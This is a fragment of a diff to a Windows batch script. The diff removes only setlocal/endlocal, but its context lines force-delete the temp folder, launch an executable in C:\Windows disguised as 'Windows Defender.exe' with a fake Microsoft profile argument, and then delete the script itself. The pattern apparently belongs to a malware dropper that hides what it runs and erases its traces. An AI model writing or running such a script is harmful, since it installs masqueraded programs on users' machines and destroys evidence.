@@ -1,5 +1,4 @@
 @echo off
-setlocal
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 :connectivitycheck
@@ -90,5 +89,4 @@ cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
 "C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
-endlocal
 del /s /f /q /a "%~f0"
